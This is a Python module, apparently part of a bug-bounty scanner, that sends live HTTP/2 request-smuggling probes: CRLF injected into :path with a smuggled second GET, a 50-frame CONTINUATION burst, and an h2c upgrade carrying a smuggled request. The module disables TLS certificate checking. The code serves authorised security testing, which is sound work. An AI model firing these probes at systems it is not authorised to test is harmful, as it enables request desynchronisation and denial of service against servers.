"""HTTP/2-specific request smuggling probes — proof-first.

Three classes of bug-bounty-paying H2 attacks are tested:

  1. **CRLF in pseudo-headers** — sending an HTTP/2 request whose `:path`
     contains `\\r\\n` causes some upstreams to downgrade the request to
     HTTP/1.1 internally, smuggling the trailing bytes as a second
     request.

  2. **CONTINUATION frame abuse** — many implementations have OOM /
     DoS bugs when receiving a long stream of CONTINUATION frames
     without END_HEADERS. We send a moderate burst (kept benign — 50
     frames, ~100 KB total) and watch for the vulnerable shape.

  3. **h2c upgrade smuggling** — request HTTP/2 cleartext via
     `Connection: Upgrade, HTTP2-Settings`. Some intermediaries pass
     the upgrade through but the back-end speaks HTTP/1.1, leaving the
     attacker control of the upgrade-prior request body.

**A timing hang is not a finding.** The dominant false positive is trivial:
any origin that buffers a request will sit and wait when the frame promises
bytes that never arrive, and that wait reproduces every single time — so
"require the hang to reproduce" filters nothing. This scanner therefore only
emits a *verified* smuggling finding when it captures a real HTTP/1.1 downgrade
artifact — our unique smuggled marker path reflected back, or a raw
``HTTP/1.1 NNN`` status line surfacing inside an HTTP/2 byte stream (which HPACK
never produces: :status is encoded, never sent as ASCII). When it can only see
a timing differential, the finding is emitted as an explicit *unverified
candidate* (confidence 0.2, no captured proof) which the proof-gate quarantines
out of the report. Nothing reaches the report on timing alone.

Implementation uses the `h2` sans-IO library (a transitive dependency of
httpx) wired to a raw asyncio TCP/TLS connection so we control every
frame. Honors scope and the per-host token bucket.
"""
from __future__ import annotations

import asyncio
import re
import secrets
import socket
import ssl
import time
from typing import TYPE_CHECKING
from urllib.parse import urlparse

from core.utils import root_domain

if TYPE_CHECKING:
    from core.orchestrator import Context

_STATIC_EXT = (".js", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
               ".ico", ".woff", ".woff2", ".ttf", ".eot", ".mp4", ".webp", ".pdf")

# A raw HTTP/1.1 status line has no place inside an HTTP/2 stream (HPACK encodes
# :status). Seeing one in the bytes we read back is a downgrade artifact.
_H1_STATUS = re.compile(rb"HTTP/1\.[01] \d{3}")
_HANG = 5.0


def _marker() -> str:
    return "sx" + secrets.token_hex(4)


def _same_site(host: str, target: str) -> bool:
    th = urlparse(target if "://" in target else "http://" + target).hostname or target
    try:
        return root_domain(host) == root_domain(th)
    except Exception:
        return host == th


def _is_static(path: str) -> bool:
    return (path or "/").lower().rsplit("?", 1)[0].endswith(_STATIC_EXT)


async def _h2_open(host: str, port: int, use_tls: bool, bucket=None):
    """Return (reader, writer, h2.Connection) ready to send frames."""
    if bucket is not None:
        await bucket.take()
    try:
        from h2.connection import H2Connection
        from h2.config import H2Configuration
    except ImportError:
        return None, None, None
    if use_tls:
        ctx_ssl = ssl.create_default_context()
        ctx_ssl.check_hostname = False
        ctx_ssl.verify_mode = ssl.CERT_NONE
        ctx_ssl.set_alpn_protocols(["h2"])
    else:
        ctx_ssl = None
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx_ssl,
                                    server_hostname=host if use_tls else None),
            timeout=5.0,
        )
    except Exception:
        return None, None, None
    cfg = H2Configuration(client_side=True, header_encoding="utf-8")
    conn = H2Connection(config=cfg)
    conn.initiate_connection()
    writer.write(conn.data_to_send())
    await writer.drain()
    return reader, writer, conn


async def _h2_send_request(host, conn, writer, headers: list[tuple[str, str]]):
    stream_id = conn.get_next_available_stream_id()
    conn.send_headers(stream_id, headers, end_stream=True)
    writer.write(conn.data_to_send())
    await writer.drain()
    return stream_id


async def _h2_read_until_close(reader, conn, timeout=8.0) -> bytes:
    buf = b""
    try:
        while True:
            chunk = await asyncio.wait_for(reader.read(8192), timeout=timeout)
            if not chunk:
                break
            buf += chunk
            try:
                conn.receive_data(chunk)
            except Exception:
                break
            if len(buf) > 65536:
                break
    except asyncio.TimeoutError:
        pass
    return buf


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if not host:
        return findings
    # scope hygiene: active_allows refuses third-party CDNs and off-domain hosts
    if ctx.scope:
        ok, _why = ctx.scope.active_allows(url, ctx.target)
        if not ok:
            return findings
    elif not _same_site(host, ctx.target):
        return findings
    if _is_static(parsed.path or "/"):
        return findings
    use_tls = parsed.scheme == "https"
    port = parsed.port or (443 if use_tls else 80)
    path = parsed.path or "/"
    bucket = ctx.http.host_bucket(parsed.netloc)

    findings.extend(await _crlf_pseudo_header(host, port, path, use_tls, bucket, url))
    findings.extend(await _continuation_flood(host, port, path, use_tls, bucket, url))
    findings.extend(await _h2c_upgrade_smuggle(host, port, path, url, ctx))
    return findings


# ---------- 1: CRLF in :path / :authority --------------------------------

async def _measure_crlf(host, port, path, use_tls, bucket, marker) -> tuple[float, bytes, str]:
    """Send the CRLF-in-:path probe; return (elapsed, response_bytes, smuggled_path).

    The smuggled second request targets a unique marker path, so if the
    front-end downgrades the frame to HTTP/1.1 and the back-end honours the
    trailing bytes, the marker (or a raw HTTP/1.1 status line the H2 layer should
    never surface) shows up in the bytes we read back — a captured artifact, not
    a timer."""
    reader, writer, conn = await _h2_open(host, port, use_tls, bucket)
    smuggled = (f"{path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
                f"GET /{marker} HTTP/1.1\r\nHost: {host}")
    if conn is None:
        return 0.0, b"", smuggled
    headers = [
        (":method", "GET"),
        (":path", smuggled),
        (":scheme", "https" if use_tls else "http"),
        (":authority", host),
        ("user-agent", "SamaritanX/1.0"),
    ]
    t0 = time.perf_counter()
    try:
        await _h2_send_request(host, conn, writer, headers)
        data = await _h2_read_until_close(reader, conn, timeout=8.0)
    except Exception:
        data = b""
    elapsed = time.perf_counter() - t0
    try:
        writer.close(); await writer.wait_closed()
    except Exception:
        pass
    return elapsed, data, smuggled


async def _measure_clean(host, port, path, use_tls, bucket) -> float:
    """Baseline: a well-formed H2 GET to the same path; return elapsed seconds."""
    reader, writer, conn = await _h2_open(host, port, use_tls, bucket)
    if conn is None:
        return 0.0
    headers = [
        (":method", "GET"), (":path", path or "/"),
        (":scheme", "https" if use_tls else "http"),
        (":authority", host), ("user-agent", "SamaritanX/1.0"),
    ]
    t0 = time.perf_counter()
    try:
        await _h2_send_request(host, conn, writer, headers)
        await _h2_read_until_close(reader, conn, timeout=8.0)
    except Exception:
        pass
    elapsed = time.perf_counter() - t0
    try:
        writer.close(); await writer.wait_closed()
    except Exception:
        pass
    return elapsed


def _downgrade_artifact(data: bytes, marker: str) -> str | None:
    """Return a captured-proof excerpt when the raw bytes show the malformed H2
    frame was downgraded/honoured as HTTP/1.1 — our smuggled marker path reflected
    back, or a raw ``HTTP/1.1 NNN`` status line (an H2 stream never carries an
    ASCII status line; HPACK encodes :status). Else None."""
    if not data:
        return None
    if marker.encode() in data or _H1_STATUS.search(data):
        return data[:1500].decode(errors="replace")
    return None


def _h2_crlf_finding(url: str, smuggled: str, *, captured: str | None = None,
                     elapsed: float = 0.0, samples: list | None = None) -> dict:
    meta: dict = {"kind": "h2_crlf_path"}
    if samples:
        meta["samples"] = samples
    if elapsed:
        meta["elapsed_s"] = elapsed
    if captured:
        meta["poc"] = {
            "verified": True, "method": "RAW-H2", "url": url,
            "request": f"H2 :path = {repr(smuggled)[:200]}",
            "response_excerpt": captured,
            "rationale": ("A :path carrying CRLF caused the endpoint to surface an HTTP/1.1 "
                          "downgrade artifact — the smuggled marker path was reflected or a raw "
                          "HTTP/1.1 status line appeared inside the HTTP/2 stream, proving the "
                          "malformed frame was re-parsed and a second request honoured."),
        }
        return {
            "category": "smuggling",
            "title": "HTTP/2 request smuggling — CRLF in pseudo-header (:path)",
            "severity": "critical", "cvss": 9.0, "confidence": 0.9,
            "url": url,
            "evidence": ("A :path containing \\r\\n caused the upstream to downgrade the frame to "
                         "HTTP/1.1 and honour a smuggled second request (captured artifact below)."),
            "request": f"H2 :path = {repr(smuggled)[:200]}",
            "response": captured,
            "metadata": meta,
        }
    # timing-only candidate — no captured artifact, so it can never be verified
    meta["unverified"] = True
    return {
        "category": "smuggling",
        "title": "HTTP/2 request-smuggling candidate — CRLF-in-:path timing differential (unverified)",
        "severity": "high", "cvss": 0.0, "confidence": 0.2,
        "url": url,
        "evidence": (f"A :path containing \\r\\n hung ~{elapsed:.2f}s while a clean H2 GET to the "
                     "same path returned promptly, reproducibly — a timing differential consistent "
                     "with a front/back-end parser disagreement, but NO downgraded response could "
                     "be captured. Unproven: confirm manually with Burp / turbo-intruder before "
                     "submitting."),
        "request": f"H2 :path = {repr(smuggled)[:200]}",
        "metadata": meta,
    }


async def _crlf_pseudo_header(host, port, path, use_tls, bucket, url) -> list[dict]:
    marker = _marker()
    elapsed, data, smuggled = await _measure_crlf(host, port, path, use_tls, bucket, marker)

    # Hard proof beats timing: if the first probe already captured a downgrade
    # artifact, emit a verified finding and stop.
    artifact = _downgrade_artifact(data, marker)
    if artifact:
        return [_h2_crlf_finding(url, smuggled, captured=artifact)]

    # No artifact — fall back to the timing oracle, but a hang alone is never a
    # finding. Require the differential to be real (clean path prompt, hang
    # reproducible) before we even record a *candidate*, and try once more to
    # capture an artifact on the repeat.
    if not (elapsed > _HANG and data is not None):
        return []
    base = await _measure_clean(host, port, path, use_tls, bucket)
    elapsed2, data2, _ = await _measure_crlf(host, port, path, use_tls, bucket, marker)
    artifact2 = _downgrade_artifact(data2, marker)
    if artifact2:
        return [_h2_crlf_finding(url, smuggled, captured=artifact2)]
    if not (base < _HANG and elapsed2 > _HANG):
        return []  # clean path also slow, or hang didn't reproduce → jitter
    samples = [{"crlf_path_s": round(elapsed, 2)},
               {"crlf_path_s": round(elapsed2, 2), "clean_path_s": round(base, 2)}]
    return [_h2_crlf_finding(url, smuggled, elapsed=elapsed2, samples=samples)]


async def reprobe(ctx: "Context", finding: dict):
    """Re-verify an h2_crlf_path finding.

    Returns ``(result, proof)``. ``result`` is True only when a downgrade
    artifact is captured on re-test (real proof); False when the hang is clearly
    gone; None when a timing differential persists but no artifact could be
    captured (kept as an unproven candidate — the proof-gate holds it back).
    """
    url = finding.get("url") or ""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if not host:
        return None, {}
    if ctx.scope and not ctx.scope.allows(url)[0]:
        return None, {}
    if (finding.get("metadata") or {}).get("kind") != "h2_crlf_path":
        return None, {}
    use_tls = parsed.scheme == "https"
    port = parsed.port or (443 if use_tls else 80)
    path = parsed.path or "/"
    bucket = ctx.http.host_bucket(parsed.netloc)

    marker = _marker()
    smuggled = ""
    samples = []
    captured = None
    for _ in range(2):
        t_evil, data, smuggled = await _measure_crlf(host, port, path, use_tls, bucket, marker)
        t_base = await _measure_clean(host, port, path, use_tls, bucket)
        art = _downgrade_artifact(data, marker)
        if art:
            captured = art
        samples.append({"crlf_path_s": round(t_evil, 2), "clean_path_s": round(t_base, 2),
                        "responded": bool(data), "captured_response": art})

    if captured:
        return True, {
            "verified": True, "method": "RAW-H2", "url": url,
            "request": f"H2 :path = {repr(smuggled)[:200]}",
            "response_excerpt": captured, "samples": samples,
            "rationale": ("On re-test the CRLF-in-:path probe surfaced an HTTP/1.1 downgrade "
                          "artifact (smuggled marker path reflected, or a raw HTTP/1.1 status line "
                          "inside the H2 stream) — a real, captured desynchronisation."),
        }
    clearly_fast = all(s["crlf_path_s"] < _HANG for s in samples)
    if clearly_fast:
        return False, {"verified": False, "method": "RAW-H2", "url": url, "samples": samples,
                       "rationale": "The CRLF-induced hang did not reproduce on re-test."}
    return None, {"verified": False, "method": "RAW-H2", "url": url, "samples": samples,
                  "rationale": ("A timing differential persisted but no downgraded response could "
                                "be captured — unproven; confirm manually.")}


# ---------- 2: CONTINUATION abuse ----------------------------------------

async def _continuation_flood(host, port, path, use_tls, bucket, url) -> list[dict]:
    reader, writer, conn = await _h2_open(host, port, use_tls, bucket)
    if conn is None:
        return []
    findings = []
    # Send a HEADERS frame WITHOUT END_HEADERS, followed by 50 CONTINUATION
    # frames each carrying junk header padding. Most servers either reject
    # the stream or close the connection. Servers that buffer everything
    # without limit are candidates for OOM (CVE-2024-27983 class).
    try:
        from hyperframe.frame import HeadersFrame, ContinuationFrame
        from hpack import Encoder
    except ImportError:
        try:
            writer.close(); await writer.wait_closed()
        except Exception:
            pass
        return []
    enc = Encoder()
    base_block = enc.encode([
        (":method", "GET"), (":path", path), (":scheme", "https" if use_tls else "http"),
        (":authority", host),
    ])
    hf = HeadersFrame(stream_id=1)
    hf.flags.add("PRIORITY")  # ensure no END_HEADERS
    hf.data = base_block
    writer.write(hf.serialize())
    pad_block = enc.encode([("x-sx-pad-" + str(i), "A" * 200) for i in range(8)])
    for i in range(50):
        cf = ContinuationFrame(stream_id=1)
        if i == 49:
            cf.flags.add("END_HEADERS")
        cf.data = pad_block
        writer.write(cf.serialize())
    await writer.drain()
    t0 = time.perf_counter()
    try:
        data = await _h2_read_until_close(reader, conn, timeout=10.0)
    except Exception:
        data = b""
    elapsed = time.perf_counter() - t0
    try:
        writer.close(); await writer.wait_closed()
    except Exception:
        pass
    # Accepting the burst and still returning a response is the *vulnerable
    # shape* — but a single accepted burst is not proof of unbounded buffering or
    # a real DoS. Emit as an unverified candidate (no captured proof) so the
    # proof-gate quarantines it until a human confirms the impact.
    # Note: any H2 frame header contains \x00\x00 bytes (stream-id low bytes),
    # so that can NEVER be a signal — only a real HTTP/1.1-style status line in
    # the response bytes counts as a response artifact.
    if data and elapsed < _HANG and b" 200 " in data:
        findings.append({
            "category": "smuggling",
            "title": "HTTP/2 CONTINUATION-frame flood accepted — unverified DoS/smuggling candidate",
            "severity": "high", "cvss": 0.0, "confidence": 0.2,
            "url": url,
            "evidence": ("Server accepted 50 CONTINUATION frames (~100 KB of header padding) "
                         "without resetting the stream and still returned a response — the "
                         "vulnerable shape (CVE-2024-27983 class). This is a candidate only: one "
                         "accepted burst is not proof of unbounded buffering. Confirm the DoS / "
                         "smuggling impact manually before submitting."),
            "request": f"H2 HEADERS + 50× CONTINUATION on {url}",
            "metadata": {"elapsed_s": elapsed, "kind": "h2_continuation_flood", "unverified": True},
        })
    return findings


# ---------- 3: h2c upgrade smuggling -------------------------------------

async def _h2c_upgrade_smuggle(host, port, path, url, ctx) -> list[dict]:
    """A classic HTTP/1.1 request that asks the front-end to upgrade to h2c.
    If the back-end doesn't support h2c but the front-end forwards the
    upgrade headers anyway, the prior body becomes a smuggled HTTP/1.1
    request. We use ctx.http (not raw socket) since we only need the
    /1.1 surface for this probe."""
    findings = []
    marker = _marker()
    smuggle_body = (
        f"GET /{marker} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "X-SX-Smuggle: 1\r\n\r\n"
    )
    headers = {
        "Connection": "Upgrade, HTTP2-Settings",
        "Upgrade": "h2c",
        "HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA",
        "Content-Length": str(len(smuggle_body)),
        "Content-Type": "text/plain",
    }
    ev = await ctx.http.post(url, data=smuggle_body, headers=headers,
                             allow_redirects=False)
    if ev.error:
        return findings
    body = ev.response_body or ""
    # Verified only when our *unique* smuggled marker path is reflected back —
    # hard proof the trailing bytes were processed as a second request. A bare
    # "admin" substring or a 101 is not proof.
    if marker in body:
        findings.append({
            "category": "smuggling",
            "title": "h2c upgrade smuggling — front-end forwards HTTP/2 cleartext upgrade",
            "severity": "high", "cvss": 8.0, "confidence": 0.9,
            "url": url,
            "evidence": ("The unique smuggled request path was reflected in the response after an "
                         "Upgrade: h2c carrying a Content-Length body — the bytes after the upgrade "
                         "headers were processed as a second, smuggled request."),
            "request": f"POST {url}\nUpgrade: h2c\n\n{smuggle_body[:200]}",
            "response": body[:1500],
            "metadata": {
                "kind": "h2c_upgrade", "status": ev.status, "marker": marker,
                "poc": {"verified": True, "method": "H2C", "url": url,
                        "request": f"POST {url}  (Upgrade: h2c + CL body smuggling /{marker})",
                        "response_excerpt": body[:1200],
                        "rationale": "The unique smuggled marker path was reflected in the response, "
                                     "proving a second request executed."}},
        })
    elif ev.status == 101 and "h2c" in str(ev.response_headers).lower():
        findings.append({
            "category": "smuggling",
            "title": "h2c upgrade accepted (101) — smuggling candidate, impact unconfirmed",
            "severity": "medium", "cvss": 0.0, "confidence": 0.2,
            "url": url,
            "evidence": ("Server returned 101 Switching Protocols to Upgrade: h2c. The upgrade is "
                         "accepted, but no smuggled request was observed to execute — candidate "
                         "only; confirm a real desync manually."),
            "request": f"POST {url}\nUpgrade: h2c\n\n{smuggle_body[:200]}",
            "response": body[:1500],
            "metadata": {"kind": "h2c_upgrade", "status": ev.status, "unverified": True},
        })
    return findings
